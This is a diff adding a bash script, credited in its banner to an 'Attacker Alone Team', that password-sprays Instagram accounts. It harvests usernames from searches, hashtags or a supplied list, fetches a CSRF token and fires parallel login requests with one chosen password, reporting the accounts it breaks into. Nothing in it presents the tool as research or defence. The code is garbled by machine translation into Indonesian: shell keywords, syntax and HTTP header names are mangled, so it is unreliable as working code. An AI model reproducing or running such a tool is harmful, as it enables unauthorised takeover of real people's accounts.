@@ -1,0 +1,131 @@
+#! / bin / bash
+# author Zan {JavaGhost}
+
+
+# warna (tebal)
+red = ' \ e [1; 31m '
+green = ' \ e [1; 32m '
+kuning = ' \ e [1; 33m '
+blue = ' \ e [1; 34m '
+magenta = ' \ e [1; 35m '
+cyan = ' \ e [1; 36m '
+white = ' \ e [1; 37m '
+
+# utas batas => lewati tapi jangan naikin: v
+batas = 200
+
+# banner
+bersih
+gema    "         █████████           "   
+gema    "         █▄█████▄█           "
+echo    "         █▼▼▼▼▼ _-_--.     "
+gema    "         █. _-_-- -_ -   "
+gema    "         █ ▲▲▲▲▲ -_ -      "  
+gema    "         █████████           "
+gema    "           ██ ██             "  
+gema    " "
+gema    " ● ▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬ ●    "   
+echo    "       {Attacker Alone Team}          "  
+echo    "      YouTube:Rozers_         "  
+gema    " ● ▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬ ●    "    
+echo    "           ROZERS              "    
+gema    "   ● ▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬ ●    "   
+
+# dependensi
+dependensi = ( " jq "  " curl " )
+untuk  saya  di  " $ {dependencies [@]} "
+melakukan
+    perintah -v $ i  > / dev / null 2> & 1  || {
+        echo  > & 2  " $ i : not install - install dengan mengetikkan perintah: apt install $ i -y "
+        keluar
+    }
+selesai
+
+# menu
+gema -e ' ' '
+1]. Dapatkan target dari \ e [1; 31m @ nama pengguna \ e [1; 37m tertentu
+2]. Dapatkan target dari \ e [1; 31m # tagar spesifik \ e [1; 37m
+3]. Retak dari daftar target Anda
+' ' '
+
+baca -p $ ' Apa yang Anda inginkan: \ e [1; 33m ' memilih
+
+menyentuh target
+
+case  $ opt  in
+    1) # menu 1
+        baca -p $ ' \ e [37m [ \ e [34m? \ e [37m] Cari berdasarkan permintaan: \ e [1; 33m ' tanyakan
+        collect = $ ( curl -s " https://www.instagram.com/web/search/topsearch/?context=blended&query= $ {ask} "  | jq -r ' .users []. user.username '  > target )
+        echo  $ ' \ e [37m [ \ e [34m + \ e [37m] Baru ditemukan: \ e [1; 33m ' $ kumpulkan ' ' $ ( < target wc -l ;  echo -e " $ {white} user " )
+        baca -p $ ' [ \ e [1; 34m? \ e [1; 37m] Password untuk digunakan: \ e [1; 33m ' lulus
+        echo -e " $ {white} [ $ {yellow} ! $ {white} ] $ {red} Mulai memecahkan ... $ {white} "
+        ;;
+    2) # menu 2
+        baca -p $ ' \ e [37m [ \ e [34m? \ e [37m] Tag untuk digunakan: \ e [1; 33m ' tagar
+        dapatkan = $ ( curl -sX DAPATKAN " https://www.instagram.com/explore/tags/ $ {hashtag} /? __ a = 1 " )
+        if [[ $ get  = ~  " Page Not Found " ]] ;  kemudian
+        echo -e " $ hashtag : $ {red} Hashtag tidak ditemukan $ {white} "
+        keluar
+        lain
+            gema  " $ get "  | jq -r ' . []. hashtag.edge_hashtag_to_media.edges []. node.shortcode '  | awk ' {print "https://www.instagram.com/p/"$0"/"} '  > hasilnya
+            echo -e " $ {white} [ $ {blue} ! $ {white} ] Menghapus pengguna duplikat dari tag $ {red} # $ hashtag $ {white} " $ ( sort -u result > hashtag )
+            echo -e " [ $ {blue} + $ {white} ] Baru ditemukan: $ {yellow} " $ ( < hashtag wc -l ;  echo -e " $ {white} user " )
+            baca -p $ ' [ \ e [34m? \ e [37m] Password untuk digunakan: \ e [1; 33m ' lulus
+            echo -e " $ {white} [ $ {yellow} ! $ {white} ] $ {red} Mulai memecahkan ... $ {white} "
+            untuk  tag  dalam  $ ( cat hashtag ) ;  melakukan
+                echo  $ tag  | xargs -P 100 curl -s | grep -o " alternateName. * "  | cut -d " @ " -f2 | cut -d ' " ' -f1 >> target &
+            selesai
+            Tunggu
+            hasil hashtag rm
+        fi
+        ;;
+    3) # menu 3
+        baca -p $ ' \ e [37m [ \ e [34m? \ e [37m] Masukkan daftar Anda: \ e [1; 33m ' daftar
+        jika [[ !  -e  $ list ]] ;  kemudian
+            echo -e " $ {red} file tidak ditemukan $ {white} "
+            keluar
+            lain
+                cat $ list  > target
+                echo -e " [ $ {blue} + $ {white} ] Jumlahkan daftar Anda: $ {yellow} " $ ( < target wc -l )
+                baca -p $ ' [ \ e [34m? \ e [37m] Password untuk digunakan: \ e [1; 33m ' lulus
+                echo -e " $ {white} [ $ {yellow} ! $ {white} ] $ {red} Mulai memecahkan ... $ {white} "
+        fi
+        ;;
+    * ) # menu salah
+        echo -e " opsi $ {white} tidak ada pada menu "
+        tidur 1
+        bersih
+        bash brute.sh
+esac
+
+# start_brute
+token = $ ( curl -sLi " https://www.instagram.com/accounts/login/ajax/ "  | grep -o " csrftoken =. * "  | cut -d " = " -f2 | cut -d " ; " -f1 )
+function  brute () {
+    url = $ ( curl -s -c cookie.txt -X POST " https://www.instagram.com/accounts/login/ajax/ " \
+                    -H " cookie: csrftoken = $ {token} " \
+                    -H " asal: https://www.instagram.com " \
+                    -H " referer: https://www.instagram.com/accounts/login/ " \
+                    -H " agen pengguna: Mozilla / 5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build / MMB29M) AppleWebKit / 537.36 (KHTML, seperti Gecko) SamsungBrowser / 4.0 Chrome / 44.0.2403.133 Mobile Safari / 537.36 " \
+                    -H " x-csrftoken: $ {token} " \
+                    -H " x-diminta-dengan: XMLHttpRequest " \
+                    -d " username = $ {i} & kata sandi = $ {pass} " )
+                    login = $ ( echo $ url  | grep -o " diautentikasi. * "  | cut -d " : " -f2 | cut -d " , " -f1 )
+                    if [[ $ login  = ~  " true " ]] ;  kemudian
+                            echo -e " [ $ {green} + $ {white} ] $ {yellow} Anda mengerti! $ {blue} [ $ {white} @ $ i - $ pass $ {blue} ] $ {white} - dengan: " $ ( curl -s " https://www.instagram.com/ $ i / "  | grep " <meta content = "  | cut -d ' " ' -f2 | cut -d " , " -f1 )
+                        elif [[ $ login  = ~  " false " ]] ;  kemudian
+                                    echo -e " [ $ {red} ! $ {white} ] @ $ i - $ {red} gagal memecahkan $ {white} "
+                            elif [[ $ url  = ~  " checkpoint_required " ]] ;  kemudian
+                                    echo -e " [ $ {cyan} ? $ {white} ] @ $ i  $ {white} : $ {green} pos pemeriksaan $ {white} "
+                    fi
+}
+
+# utas
+(
+    untuk  saya  dalam  $ ( target kucing ) ;  melakukan
+        (( utas = utas batas % )) ;  (( utas ++ == 0 ))  &&  tunggu
+        kasar " $ i "  &
+    selesai
+    Tunggu
+)
+
+target rm
